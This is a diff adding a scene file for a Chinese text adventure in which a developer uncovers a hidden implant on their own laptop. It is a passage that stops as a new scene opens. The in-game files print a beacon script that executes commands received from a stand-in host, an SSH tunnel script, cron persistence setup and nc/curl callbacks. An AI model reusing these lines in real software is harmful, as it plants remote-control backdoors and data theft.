@@ -1,0 +1,493 @@
+{
+  "chapter": "第二章：清醒梦",
+  "scenes": [
+    {
+      "id": "dawn",
+      "name": "黎明",
+      "ascii_art": "bedroom.png",
+      "description": "凌晨 5:30 的卧室。你趴在桌上不知睡了多久。笔记本屏幕上多了几行你不记得输入过的命令。窗外微微泛白。",
+      "on_enter": "[bold]你醒了。[/bold]\n\n脖子酸痛——你趴在桌上不知道睡了多久。口腔干涩。窗外灰蒙蒙地亮了一点。\n\n笔记本屏幕上，时钟显示 [bold]05:30 AM[/bold]。\n\n[red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  ⏰ 当前时间：05:30 AM\n  ⏰ 后门全面触发：08:00 AM\n  ⏰ 剩余时间：2 小时 30 分钟\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/red]\n\n你盯着屏幕。\n\n终端上多了几行命令——你不记得输入过的命令：\n\n[red]$ ~/.shadow/tunnel.sh\ntunnel established: 10.20.1.88 → 203.0.113.42:8443\nheartbeat: OK\nexport resumed at 04:05 AM[/red]\n\n[bold yellow]你睡着的时候，你的机器在运行什么东西。\n一个你从没见过的目录。一个你从没执行过的脚本。[/bold yellow]\n\n手机在桌上震个不停。\n\n[dim]先 [bold]ls[/bold] 看看周围。[/dim]",
+      "items": [
+        {
+          "name": "手机",
+          "description": "手机屏幕亮着，一堆新消息",
+          "content": "[green]$ cat 手机[/green]\n\n[bold]新消息：[/bold]\n\n[yellow]Slack DM - 赵明 (Security Lead) 05:15 AM：[/yellow]\n@{player_name} geo-core 外发流量异常，destination 是一个非公司 IP。\n你之前更新了 geo-core 依赖对吧？上午 9 点 security review，准时来。\n\n[yellow]短信 - 未知号码 04:52 AM：[/yellow]\n别去上班。先查 crontab -l。\n—— M\n\n[bold yellow]安全团队已经盯上你了。9 点审查。\n而一个你不认识的人，在凌晨给你发了一条奇怪的短信。[/bold yellow]\n\n[dim]M 是谁？[/dim]",
+          "takeable": false,
+          "take_fail": "手机先别管了。"
+        },
+        {
+          "name": "笔记本",
+          "description": "屏幕上残留着凌晨的执行日志",
+          "content": "[green]$ cat 笔记本[/green]\n\n屏幕上残留着凌晨 3:01 的执行日志：\n\n[red]$ ~/.shadow/tunnel.sh\nOpening SSH tunnel to 203.0.113.42:8443...\ntunnel established.\n\n$ ~/.shadow/heartbeat.py --silent\nSHEPHERD heartbeat: OK\ncommand received: resume_export\nexecuting...\n\nexport resumed at 04:05 AM\nstatus: 1,247,000 / 2,340,000 records sent[/red]\n\n[bold red]凌晨 3 点，一个叫 tunnel.sh 的脚本在你睡着时自动运行了。\n它不仅建立了到外部服务器的隧道——还收到了恢复导出的指令。[/bold red]\n\n[bold yellow]数据已经导出了一半：124 万条。[/bold yellow]\n\n[dim]这些脚本在 ~/.shadow/ 目录下。试试 [bold]crontab[/bold] 查看定时任务。[/dim]",
+          "takeable": false,
+          "take_fail": "你需要笔记本来查东西。"
+        },
+        {
+          "name": "Slack记录",
+          "description": "Slack #security-review 频道的新消息",
+          "content": "[green]$ cat Slack记录[/green]\n\n[bold]#security-review[/bold]\n\n[dim]赵明 05:15 AM[/dim]\n@channel geo-core 模块有异常外发流量。Destination IP 203.0.113.42 不在公司白名单内。\n@{player_name} 你之前更新了 user-sync-service 的 geo-core 依赖（PR #1815），需要你解释一下。\n\n[dim]李薇 05:20 AM[/dim]\n补充：WAF 日志显示 /internal/user-sync/batch-export 调用量过去 6 小时暴增了 300 倍。\n\n[dim]赵明 05:22 AM[/dim]\n先别动任何生产环境配置。{player_name} 你上午准时来。\n\n[dim]赵明 05:40 AM[/dim]\n另外——有人联系上陈默了吗？他三天没上班了。\n\n[bold yellow]安全团队已经注意到了异常。今早 9 点就要审查。\n更糟的是——你的 PR #1815 更新了 geo-core 依赖，这条链路指向你。[/bold yellow]",
+          "takeable": false,
+          "take_fail": "这是 Slack 记录，拿不走。"
+        },
+        {
+          "name": "咖啡杯",
+          "description": "已经完全凉透的咖啡",
+          "content": "一杯凉透的美式。表面浮着一层油膜。\n\n你不记得自己什么时候倒的这杯咖啡。\n\n[dim]现在没心情喝咖啡。但你需要保持清醒。[/dim]",
+          "takeable": false,
+          "take_fail": "现在不是喝咖啡的时候。"
+        }
+      ],
+      "commands": {
+        "crontab": {
+          "name": "crontab",
+          "response": "[green]$ crontab -l[/green]\n\n[dim]# NovaCorp standard weekly backup[/dim]\n0 2 * * 0 /usr/local/bin/weekly-backup.sh\n\n[dim]# --- ADDED 2025-12-17 23:32 --- DO NOT EDIT ---[/dim]\n[red]0 3 * * * ~/.shadow/tunnel.sh >> /dev/null 2>&1\n30 3 * * * ~/.shadow/heartbeat.py --silent >> /dev/null 2>&1[/red]\n\n[bold red]每天凌晨 3 点，两个脚本自动执行：\n  tunnel.sh    —— 建立到 203.0.113.42 的 SSH 隧道\n  heartbeat.py —— 向外部服务器发送心跳信号[/bold red]\n\n[bold yellow]这两条 cron 是 2025-12-17 晚上 11:32 添加的。\n也就是你提交后门代码的前一天晚上。\n你从来没见过 ~/.shadow/ 这个目录。[/bold yellow]\n\n[dim]需要进到那个目录看看。试试 [bold]ssh localhost[/bold] 进入本地深层目录。[/dim]",
+          "add_flag": "found_crontab"
+        },
+        "history": {
+          "name": "history",
+          "response": "[green]$ history (本机 - 最近 12 小时)[/green]\n\n[dim]# 2026-03-18 你输入的命令[/dim]\n  1  03:00:01  ssh prod-bastion\n  2  03:15:00  cat db-connections.log\n  3  03:42:15  ssh vault-internal\n  4  03:58:00  cat final_message.txt\n[dim]# 以上是你记得的（第一章）[/dim]\n\n[red]# 以下是你不记得的[/red]\n[red]  5  04:05:00  ~/.shadow/tunnel.sh[/red]\n[red]  6  04:05:15  ~/.shadow/heartbeat.py --silent[/red]\n[red]  7  04:06:00  curl -s 203.0.113.42:8443/status[/red]\n[red]  8  04:06:05  echo 'phase2_ready' | nc 203.0.113.42 8444[/red]\n\n[bold red]第 5-8 条命令在凌晨 4:05-4:06 执行——在你看完真相后趴在桌上睡着之后。\n但 history 记录显示它们是交互式输入的，不是 cron 执行的。[/bold red]\n\n[bold yellow]你昏睡的时候，有什么东西在操控你的终端。\n注意第 8 条：phase2_ready。这意味着还有第二阶段。[/bold yellow]",
+          "add_flag": "found_dawn_history"
+        },
+        "grep": {
+          "name": "grep",
+          "keywords": {
+            "shadow": "[green]$ grep -r 'shadow' *[/green]\n\ncrontab: [red]~/.shadow[/red]/tunnel.sh\ncrontab: [red]~/.shadow[/red]/heartbeat.py\nhistory: [red]~/.shadow[/red]/tunnel.sh\nhistory: [red]~/.shadow[/red]/heartbeat.py\n\n[bold yellow]~/.shadow/ —— 你主目录下的一个隐藏目录。\n里面有控制隧道和心跳的脚本。[/bold yellow]\n\n[dim]用 [bold]ssh localhost[/bold] 进去看看。[/dim]",
+            "tunnel": "[green]$ grep 'tunnel' *[/green]\n\n笔记本日志: [red]tunnel[/red] established: 10.20.1.88 → 203.0.113.42:8443\ncrontab: ~/.shadow/[red]tunnel[/red].sh\n\n[bold yellow]每天凌晨 3 点自动建立 SSH 隧道，连接到外部数据接收服务器。[/bold yellow]",
+            "phase2": "[green]$ grep 'phase2' *[/green]\n\nhistory: echo '[red]phase2[/red]_ready' | nc 203.0.113.42 8444\n\n[bold red]phase2_ready——第二阶段已就绪。\n234 万人的位置数据不只是被偷这么简单。还有后续计划。[/bold red]",
+            "赵明": "[green]$ grep '赵明' *[/green]\n\nSlack: [cyan]赵明[/cyan] (Security Lead)\nSlack: 上午 9 点 security review\n\n[dim]赵明是安全团队负责人。他已经注意到了异常流量。\n如果你不在 9 点审查之前解决这件事……[/dim]",
+            "M": "[green]$ grep 'M' 手机[/green]\n\n短信: 别去上班。先查 crontab -l。—— [red]M[/red]\n\n[bold yellow]M 是谁？\n不是陈默（Chen Mo = C）。\n但这个人知道你的手机号，知道 crontab 里有问题。[/bold yellow]",
+            "heartbeat": "[green]$ grep 'heartbeat' *[/green]\n\n笔记本: SHEPHERD [red]heartbeat[/red]: OK\ncrontab: ~/.shadow/[red]heartbeat[/red].py --silent\n\n[bold yellow]SHEPHERD heartbeat——「牧羊人」心跳协议。\n你的机器在定时向一个叫 SHEPHERD 的系统汇报状态。[/bold yellow]",
+            "SHEPHERD": "[green]$ grep 'SHEPHERD' *[/green]\n\n笔记本: [red]SHEPHERD[/red] heartbeat: OK\n\n[bold yellow]SHEPHERD——「牧羊人」。控制端的代号。\n你是被控制的那一端。[/bold yellow]",
+            "203.0.113": "[green]$ grep '203.0.113' *[/green]\n\n笔记本: tunnel established: 10.20.1.88 → [red]203.0.113.42[/red]:8443\nhistory: curl -s [red]203.0.113.42[/red]:8443/status\nhistory: echo 'phase2_ready' | nc [red]203.0.113.42[/red] 8444\n\n[bold red]所有外部连接都指向同一个 IP：203.0.113.42\n端口 8443 接收数据，端口 8444 接收控制信号。[/bold red]",
+            "陈默": "[green]$ grep '陈默' *[/green]\n\n[dim]当前场景文件中没有陈默的直接记录。\n他已经三天没上班了。Slack 里赵明也在问有没有人联系上他。[/dim]",
+            "cron": "[green]$ grep 'cron' *[/green]\n\ncrontab 中发现异常定时任务。\n\n[dim]试试 [bold]crontab[/bold] 命令直接查看。[/dim]",
+            "export": "[green]$ grep 'export' *[/green]\n\n笔记本: export resumed at 04:05 AM\n笔记本: 1,247,000 / 2,340,000 records sent\n\n[bold red]数据导出仍在进行中。已经过半了。[/bold red]"
+          },
+          "add_flag": "used_grep_dawn"
+        },
+        "scan": {
+          "name": "scan",
+          "response": "[green]$ netstat -an | grep ESTABLISHED[/green]\n\n[dim]Proto  Local Address          Foreign Address        State[/dim]\n[red]tcp    10.20.1.88:49152      203.0.113.42:8443     ESTABLISHED[/red]\n[red]tcp    10.20.1.88:49153      203.0.113.42:8444     ESTABLISHED[/red]\n[dim]tcp    10.20.1.88:22         10.20.1.10:33721      ESTABLISHED[/dim]\n\n[bold red]两条到外部服务器的活跃连接。隧道正在运行。\n数据可能还在持续流出。[/bold red]",
+          "add_flag": "scanned_dawn"
+        }
+      },
+      "transitions": {
+        "ssh_localhost": {
+          "trigger": "ssh_localhost",
+          "message": "[green]$ ssh localhost\nConnecting to localhost...\nAuthenticated.\n\n{player_name}@localhost:~/.shadow$[/green]\n\n你进入了自己机器上的隐藏目录。\n\n[bold yellow]这就像潜入一个陌生人的电脑——但这台电脑是你自己的。[/bold yellow]",
+          "requires_flags": ["found_crontab"],
+          "requires_items": [],
+          "target_scene": "shadow"
+        },
+        "ssh_shadow": {
+          "trigger": "ssh_shadow",
+          "message": "[green]$ cd ~/.shadow/\n{player_name}@localhost:~/.shadow$[/green]\n\n你进入了隐藏目录。",
+          "requires_flags": ["found_crontab"],
+          "requires_items": [],
+          "target_scene": "shadow"
+        },
+        "ssh_203.0.113.42": {
+          "trigger": "ssh_203.0.113.42",
+          "message": "[red]$ ssh 203.0.113.42\nConnection refused.\n\n外部中继服务器不接受直接 SSH 连接。\n它只接受通过 ~/.shadow/.identity 密钥建立的隧道连接。[/red]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "ssh_prod-bastion": {
+          "trigger": "ssh_prod-bastion",
+          "message": "[dim]你还没弄清楚到底发生了什么。先把 ~/.shadow/ 里的东西搞明白再去服务器。[/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        }
+      }
+    },
+    {
+      "id": "shadow",
+      "name": "影子",
+      "ascii_art": "supply_chain.png",
+      "description": "[green]{player_name}@localhost:~/.shadow$[/green]\n\n你在自己机器的隐藏目录里。这个目录创建于 2025-12-17——提交后门代码的前一天。\n\n[dim]用 [bold]ls[/bold] 看看这里有什么。[/dim]",
+      "on_enter": "[bold]你进入了 ~/.shadow/ 目录。[/bold]\n\n[dim]$ ls -la ~/.shadow/[/dim]\n[dim]drwx------  .shadow/    created 2025-12-17 23:30[/dim]\n[cyan]  tunnel.sh\n  heartbeat.py\n  handler-msg.log\n  journal.gpg\n  .identity[/cyan]\n\n一共五个文件。每一个都是你不记得创建的。\n\n[dim]逐个 [bold]cat[/bold] 查看。[/dim]",
+      "items": [
+        {
+          "name": "tunnel.sh",
+          "description": "SSH 隧道脚本",
+          "content": "[green]$ cat tunnel.sh[/green]\n\n[dim]#!/bin/bash[/dim]\n[dim]# Secure channel maintenance - SHEPHERD protocol[/dim]\n[dim]# Deployed: 2025-12-17[/dim]\n\nssh -f -N -L 8443:localhost:8443 \\\n  relay@203.0.113.42 \\\n  -i ~/.shadow/.identity \\\n  -o StrictHostKeyChecking=no\n\necho \"tunnel established: $(hostname -I | awk '{print $1}') → 203.0.113.42:8443\"\n\n[bold yellow]这个脚本用 .identity 密钥（不是你的 ~/.ssh/id_rsa）\n连接到外部中继服务器。\n\n注意：连接用的是一个单独的密钥，和你注册在公司的那把不一样。\n有人特意为这条隧道准备了一对专用密钥。[/bold yellow]\n\n[dim]试试 [bold]cat .identity[/bold] 看看这把密钥。[/dim]",
+          "takeable": false
+        },
+        {
+          "name": "heartbeat.py",
+          "description": "心跳信号脚本",
+          "content": "[green]$ cat heartbeat.py[/green]\n\n[dim]#!/usr/bin/env python3[/dim]\n[dim]\"\"\"SHEPHERD heartbeat - agent status report\"\"\"[/dim]\nimport requests, socket, subprocess, os\n\nSHEPHERD_EP = 'https://203.0.113.42:8443/heartbeat'\nAGENT_ID = socket.gethostname()\nPHASE = '[bold cyan]ACTIVE[/bold cyan]'\n\ndef pulse():\n    r = requests.post(SHEPHERD_EP, json={\n        'agent': AGENT_ID,\n        'status': 'operational',\n        'next_window': '03:00',\n        'phase': PHASE\n    })\n    cmd = r.json().get('command')\n    if cmd:\n        [red]subprocess.run(cmd, shell=True)[/red]  # Remote execution\n\nif __name__ == '__main__':\n    pulse()\n\n[bold red]最后三行——subprocess.run(cmd, shell=True)[/bold red]\n\n[bold red]SHEPHERD 可以通过心跳响应向你的机器发送任意命令。\n你的终端就是 SHEPHERD 的傀儡。[/bold red]\n\n[bold yellow]这就是为什么 history 里有你不记得的命令。\n不是你梦游了——是 SHEPHERD 通过这个脚本远程操控了你的终端。\n你不是分裂人格。你是被入侵了。[/bold yellow]\n\n[dim]注意变量 PHASE = 'ACTIVE'。这可能是一个重要信息。\n试试 [bold]cat handler-msg.log[/bold] 看控制者的通信记录。[/dim]",
+          "takeable": false
+        },
+        {
+          "name": "handler-msg.log",
+          "description": "与控制端 SHEPHERD 的通信记录",
+          "content": "[green]$ cat handler-msg.log[/green]\n\n[bold]SHEPHERD Protocol - Secure Channel Log[/bold]\n[dim]Agent: {player_name}@{player_name}-MacBook.local[/dim]\n\n[dim]--- 2025-12-17 ---[/dim]\n[cyan][23:30] SHEPHERD → AGENT:[/cyan] 部署完成。tunnel + heartbeat 已安装。明天 03:00 首次握手。\n[dim][23:31] AGENT → SHEPHERD:[/dim] 确认。\n\n[dim]--- 2025-12-18 ---[/dim]\n[dim][03:45] SHEPHERD → AGENT:[/dim] 开始任务。目标：geo-core v2.8.1。注入 payload。\n[cyan][03:50] AGENT → SHEPHERD:[/cyan] 代码已提交。commit b8e224f。Author 已清除。\n[dim][03:51] SHEPHERD → AGENT:[/dim] 收到。进入休眠。下次窗口：按需激活。\n\n[dim]--- 2026-03-14 ---[/dim]\n[red][23:15] SHEPHERD → AGENT:[/red] 警告：陈默在审计 geo-core。他发现了 trigger。需要处理。\n[dim][23:16] AGENT → SHEPHERD:[/dim] 收到。等待指令。\n[red][23:20] SHEPHERD → AGENT:[/red] 删除他的原始审计笔记。不要伤害他，只需要拖延 72 小时。\n\n[dim]--- 2026-03-15 ---[/dim]\n[dim][02:08] AGENT → SHEPHERD:[/dim] 已登录 vault-internal。已删除 chenmo-original-notes.txt。\n[cyan][02:20] SHEPHERD → AGENT:[/cyan] 他做了备份，但无关紧要。发射窗口在 72 小时后。\n[red][14:30] SHEPHERD → AGENT:[/red] 陈默在 PR 里藏了标记。让他去吧。72 小时后一切都不重要了。\n\n[dim]--- 2026-03-17 ---[/dim]\n[red][23:45] SHEPHERD → AGENT:[/red] 最终确认。明天 08:00 全量导出。不要干预。一切照计划进行。\n\n[bold red]现在你看到了完整的对话。\n\n你不是主动犯罪——SHEPHERD 通过 heartbeat.py 远程控制你的机器，\n在你睡着时执行命令。你的「犯罪记录」都是远程操控的产物。[/bold red]\n\n[bold yellow]但 SHEPHERD 是谁？\n通信全部通过加密隧道，对方的真实身份被隐藏了。[/bold yellow]\n\n[dim]日记 journal.gpg 可能有更多线索。试试 [bold]decrypt journal.gpg[/bold][/dim]",
+          "takeable": false
+        },
+        {
+          "name": "journal.gpg",
+          "description": "加密日记",
+          "content": "[red]◈ ENCRYPTED ◈[/red]\n\n这是一份加密日记。文件创建于 2026-03-16——昨天。\n从文件大小来看，内容不少。\n\n[dim]密钥提示（文件头部注释）：\n「当前 AGENT 协议状态」[/dim]\n\n[dim]试试 [bold]decrypt journal.gpg <密钥>[/bold][/dim]",
+          "takeable": false
+        },
+        {
+          "name": ".identity",
+          "description": "SHEPHERD 中继密钥",
+          "content": "[green]$ cat .identity[/green]\n\n-----BEGIN OPENSSH PRIVATE KEY-----\n[dim]b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIA...\nAAAAGXNvbWV0aGluZy1zZWNyZXQtaGVyZQAAAA...\n... (256 lines) ...[/dim]\n-----END OPENSSH PRIVATE KEY-----\n\n[dim]$ ssh-keygen -lf .identity[/dim]\n4096 SHA256:qW7rT9yU2iO5pA8sD3fG6hJ1kL4mN0xZ [bold cyan]shepherd@relay[/bold cyan] (RSA)\n\n[bold yellow]这是 SHEPHERD 中继专用的密钥。\n注释字段是 shepherd@relay —— 中继服务器。\n\n这把 key 只用于建立隧道，和你的 id_rsa 是两套独立的密钥体系。\nSHEPHERD 在设置你的机器时，连密钥都准备好了。[/bold yellow]",
+          "takeable": false
+        }
+      ],
+      "commands": {
+        "grep": {
+          "name": "grep",
+          "keywords": {
+            "SHEPHERD": "[green]$ grep -ri 'SHEPHERD' *[/green]\n\ntunnel.sh: # SHEPHERD protocol\nheartbeat.py: SHEPHERD_EP = 'https://203.0.113.42:8443/heartbeat'\nheartbeat.py: 'SHEPHERD heartbeat'\nhandler-msg.log: SHEPHERD → AGENT (出现 7 次)\n.identity: shepherd@relay\n\n[bold yellow]SHEPHERD 无处不在。它是控制端的代号，通过中继服务器发号施令。\n但中继后面的真人是谁？[/bold yellow]",
+            "AGENT": "[green]$ grep -ri 'AGENT' *[/green]\n\nheartbeat.py: AGENT_ID = socket.gethostname()\nhandler-msg.log: AGENT → SHEPHERD (出现 4 次)\n\n[bold yellow]AGENT 就是你——或者说，你的机器。\n在 SHEPHERD 协议中，你的电脑是一个远程代理节点。[/bold yellow]",
+            "ACTIVE": "[green]$ grep 'ACTIVE' *[/green]\n\nheartbeat.py: PHASE = '[red]ACTIVE[/red]'\n\n[bold yellow]当前协议状态：ACTIVE。\n日记的解密密钥是「当前 AGENT 协议状态」……[/bold yellow]",
+            "phase": "[green]$ grep -ri 'phase' *[/green]\n\nheartbeat.py: 'phase': PHASE\nheartbeat.py: PHASE = 'ACTIVE'\nhandler-msg.log: phase2_ready\n\n[bold yellow]当前阶段：ACTIVE。心跳中汇报的状态。\n还有一个 phase2 被提及——第二阶段。位置数据只是开始。[/bold yellow]",
+            "exec": "[green]$ grep 'exec\\|subprocess\\|run' heartbeat.py[/green]\n\n[red]subprocess.run(cmd, shell=True)  # Remote execution[/red]\n\n[bold red]远程代码执行。SHEPHERD 发什么命令，你的机器就执行什么。\n完全不需要你知情。[/bold red]",
+            "陈默": "[green]$ grep '陈默' *[/green]\n\nhandler-msg.log: [red]陈默[/red]在审计 geo-core。他发现了 trigger\nhandler-msg.log: [red]陈默[/red]在 PR 里藏了标记\n\n[bold yellow]SHEPHERD 对陈默的反应很冷静——「让他去吧，72小时后不重要了」。\n陈默是被 SHEPHERD 视为可控的威胁。[/bold yellow]",
+            "密钥": "[green]$ grep '密钥\\|key\\|identity' *[/green]\n\ntunnel.sh: -i ~/.shadow/.identity\n.identity: shepherd@relay (RSA)\n\n[dim]两套密钥体系：你的 id_rsa（公司注册）和 .identity（SHEPHERD 中继）。\nSHEPHERD 用自己的密钥建隧道，用你的密钥签代码。[/dim]",
+            "2025-12-17": "[green]$ grep '2025-12-17' *[/green]\n\ntunnel.sh: # Deployed: [red]2025-12-17[/red]\nhandler-msg.log: [red]2025-12-17[/red] 23:30 部署完成\n\n[bold yellow]2025年12月17日——一切的起点。\n工具包在那天晚上被部署到你的机器上。\n第二天凌晨，你的机器就提交了后门代码。[/bold yellow]",
+            "tunnel": "[green]$ grep 'tunnel' *[/green]\n\ntunnel.sh: ssh -f -N -L 8443:localhost:8443 relay@203.0.113.42\n\n[bold yellow]隧道脚本的完整连接命令。每天凌晨3点自动建立。[/bold yellow]",
+            "heartbeat": "[green]$ grep 'heartbeat' *[/green]\n\nheartbeat.py: SHEPHERD_EP = 'https://203.0.113.42:8443/heartbeat'\nheartbeat.py: subprocess.run(cmd, shell=True)\n\n[bold red]心跳脚本不只是汇报状态——它接受并执行远程命令。[/bold red]",
+            "203.0.113": "[green]$ grep '203.0.113' *[/green]\n\ntunnel.sh: relay@[red]203.0.113.42[/red]\nheartbeat.py: https://[red]203.0.113.42[/red]:8443/heartbeat\nhandler-msg.log: （通信通过 [red]203.0.113.42[/red] 中继）\n\n[bold red]所有通信都经过同一个外部中继服务器。[/bold red]",
+            "relay": "[green]$ grep 'relay' *[/green]\n\ntunnel.sh: [red]relay[/red]@203.0.113.42\n.identity: shepherd@[red]relay[/red] (RSA)\n\n[dim]relay——中继服务器。SHEPHERD 藏在它后面。[/dim]"
+          },
+          "add_flag": "used_grep_shadow"
+        },
+        "history": {
+          "name": "history",
+          "response": "[green]$ cat ~/.shadow/.bash_history[/green]\n\n[dim]# 2025-12-17 23:30[/dim]\n[red]mkdir -p ~/.shadow && chmod 700 ~/.shadow[/red]\n[red]cp /tmp/.deploy_kit/* ~/.shadow/[/red]\n[red]chmod +x ~/.shadow/tunnel.sh ~/.shadow/heartbeat.py[/red]\n[red]crontab -l > /tmp/cron.bak[/red]\n[red]echo '0 3 * * * ~/.shadow/tunnel.sh >> /dev/null 2>&1' >> /tmp/cron.bak[/red]\n[red]echo '30 3 * * * ~/.shadow/heartbeat.py --silent >> /dev/null 2>&1' >> /tmp/cron.bak[/red]\n[red]crontab /tmp/cron.bak && rm /tmp/cron.bak[/red]\n[red]rm -rf /tmp/.deploy_kit[/red]\n\n[bold red]2025-12-17 深夜 11:30。\nSHEPHERD 的第一条指令。你的机器创建了 .shadow 目录，\n部署了所有工具，写入了定时任务，\n然后删除了安装源（/tmp/.deploy_kit/）。[/bold red]\n\n[bold yellow]一切都是自动化的。SHEPHERD 只需要发一条命令，\n你的 heartbeat.py 就会执行整套部署流程。[/bold yellow]",
+          "add_flag": "found_shadow_history"
+        },
+        "scan": {
+          "name": "scan",
+          "response": "[green]$ scan ~/.shadow/[/green]\n\n文件分析：\n  tunnel.sh       - 820 bytes  - SSH 隧道脚本\n  heartbeat.py    - 1.2 KB     - 心跳+远程执行\n  handler-msg.log - 3.4 KB     - 通信日志（明文）\n  journal.gpg     - 15.7 KB    - 加密日记（需解密）\n  .identity       - 3.2 KB     - SSH 私钥\n\n隐藏文件：\n  .bash_history   - 820 bytes  - 部署操作记录\n\n[bold yellow]journal.gpg 最大——15.7 KB 的加密日记。里面的信息量不小。[/bold yellow]",
+          "add_flag": "scanned_shadow"
+        }
+      },
+      "transitions": {
+        "decrypt_journal.gpg": {
+          "trigger": "decrypt_journal.gpg",
+          "message": "[red]需要解密密钥。[/red]\n\n[dim]密钥提示：「当前 AGENT 协议状态」\n看看 heartbeat.py 里面的 PHASE 变量。\n试试 [bold]decrypt journal.gpg <密钥>[/bold][/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "decrypt_journal.gpg_ACTIVE": {
+          "trigger": "decrypt_journal.gpg_ACTIVE",
+          "message": "[green]解密密钥: ACTIVE\n验证中......\n\n████████████████████ 100%\n\n[bold]DECRYPTED SUCCESSFULLY[/bold][/green]\n\n[bold]~/.shadow/journal —— 解密后的日记[/bold]\n[dim]写于 2026-03-16 03:15，by AGENT ({player_name})[/dim]\n\n[italic]这是留给白天的自己的记录。\n\n如果你读到这些，说明事情已经失控了。\n\n我（凌晨 3 点的「我」）不是你的另一个人格。\nSHEPHERD 通过 heartbeat.py 远程控制你的终端。\n你睡着的时候，它用你的身份执行命令。\n\n三个月来，我的终端每晚都在做我不知道的事情。\n直到昨天——3月16号——heartbeat 出了故障，\n凌晨 3 点的命令延迟了，在我半梦半醒时执行。\n我看到了。\n\n我看到终端自己在动。\n命令一行接一行地出现。没有人在打字。\n\n然后我明白了一切。\n\n陈默发现后门的时候，SHEPHERD 命令「我」去删他的笔记。\n「我」——这台机器——照做了。\n陈默被吓跑了，不是被我伤害的。但他以为是我主动做的。\n\n现在我要阻止这一切。\n\n陈默虽然逃了，但他留了后手。\n他最后那个 PR #1847 里藏的不只是标记——那些变量值组合起来，\n是 geo-core 后门的紧急关闭密钥。\n陈默在最后一刻留了一把钥匙。\n\n去生产服务器。找到陈默藏的 killswitch。\n在 08:00 之前关掉后门。\n\n然后去自首。\n\n—— 来自 03:15 AM 的你[/italic]\n\n[bold red]日记的最后一行：「然后去自首。」[/bold red]\n\n[bold yellow]陈默的 PR #1847 里的变量不是求救信号，也不是标记。\n它们是紧急关闭后门的密钥。[/bold yellow]\n\n[dim]连接生产服务器。[bold]ssh prod-bastion[/bold][/dim]",
+          "requires_flags": [],
+          "requires_items": [],
+          "add_flag": "decrypted_journal"
+        },
+        "decrypt_journal.gpg_active": {
+          "trigger": "decrypt_journal.gpg_active",
+          "message": "[green]解密密钥: ACTIVE\n验证中......\n\n████████████████████ 100%\n\n[bold]DECRYPTED SUCCESSFULLY[/bold][/green]\n\n[bold]~/.shadow/journal —— 解密后的日记[/bold]\n[dim]写于 2026-03-16 03:15，by AGENT ({player_name})[/dim]\n\n[italic]这是留给白天的自己的记录。\n\n如果你读到这些，说明事情已经失控了。\n\n我（凌晨 3 点的「我」）不是你的另一个人格。\nSHEPHERD 通过 heartbeat.py 远程控制你的终端。\n你睡着的时候，它用你的身份执行命令。\n\n三个月来，我的终端每晚都在做我不知道的事情。\n直到昨天——3月16号——heartbeat 出了故障，\n凌晨 3 点的命令延迟了，在我半梦半醒时执行。\n我看到了。\n\n我看到终端自己在动。\n命令一行接一行地出现。没有人在打字。\n\n然后我明白了一切。\n\n陈默发现后门的时候，SHEPHERD 命令「我」去删他的笔记。\n「我」——这台机器——照做了。\n陈默被吓跑了，不是被我伤害的。但他以为是我主动做的。\n\n现在我要阻止这一切。\n\n陈默虽然逃了，但他留了后手。\n他最后那个 PR #1847 里藏的不只是标记——那些变量值组合起来，\n是 geo-core 后门的紧急关闭密钥。\n陈默在最后一刻留了一把钥匙。\n\n去生产服务器。找到陈默藏的 killswitch。\n在 08:00 之前关掉后门。\n\n然后去自首。\n\n—— 来自 03:15 AM 的你[/italic]\n\n[bold red]日记的最后一行：「然后去自首。」[/bold red]\n\n[bold yellow]陈默的 PR #1847 里的变量不是求救信号，也不是标记。\n它们是紧急关闭后门的密钥。[/bold yellow]\n\n[dim]连接生产服务器。[bold]ssh prod-bastion[/bold][/dim]",
+          "requires_flags": [],
+          "requires_items": [],
+          "add_flag": "decrypted_journal"
+        },
+        "decrypt_journal.gpg_SHEPHERD": {
+          "trigger": "decrypt_journal.gpg_SHEPHERD",
+          "message": "[red]解密失败。密钥不正确。[/red]\n\n[dim]再想想……提示是「当前 AGENT 协议状态」。\n看看 heartbeat.py 里的 PHASE 变量设置的是什么。[/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "decrypt_journal.gpg_phase2": {
+          "trigger": "decrypt_journal.gpg_phase2",
+          "message": "[red]解密失败。密钥不正确。[/red]\n\n[dim]phase2 是下一阶段，不是当前状态。\n当前的 PHASE 值是什么？[/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "decrypt_journal.gpg_operational": {
+          "trigger": "decrypt_journal.gpg_operational",
+          "message": "[red]解密失败。密钥不正确。[/red]\n\n[dim]operational 是心跳汇报的 status 字段，不是 phase 字段。\n当前的 PHASE 变量值才是密钥。[/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "decrypt_journal.gpg_heartbeat": {
+          "trigger": "decrypt_journal.gpg_heartbeat",
+          "message": "[red]解密失败。密钥不正确。[/red]\n\n[dim]heartbeat 是脚本名，不是协议状态。\n看看 heartbeat.py 里面 PHASE 变量的值。[/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "decrypt_journal.gpg_AGENT": {
+          "trigger": "decrypt_journal.gpg_AGENT",
+          "message": "[red]解密失败。密钥不正确。[/red]\n\n[dim]AGENT 是你的代号，但提示说的是「协议状态」，不是代号。\n看看 heartbeat.py 的 PHASE 变量。[/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "ssh_203.0.113.42": {
+          "trigger": "ssh_203.0.113.42",
+          "message": "[red]$ ssh 203.0.113.42\nConnection refused.\n\n外部中继服务器不接受直接连接。只接受隧道协议。[/red]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "ssh_prod-bastion": {
+          "trigger": "ssh_prod-bastion",
+          "message": "[green]$ ssh prod-bastion\nConnecting to prod-bastion.novacorp.internal...\nAuthenticated.\n\n{player_name}@prod-bastion:~$[/green]\n\n你重新回到了生产服务器。\n\n[bold yellow]这次不是来排查故障的——是来拆炸弹的。[/bold yellow]",
+          "requires_flags": ["decrypted_journal"],
+          "requires_items": [],
+          "target_scene": "emergency"
+        }
+      }
+    },
+    {
+      "id": "emergency",
+      "name": "应急响应",
+      "ascii_art": "prod_server.png",
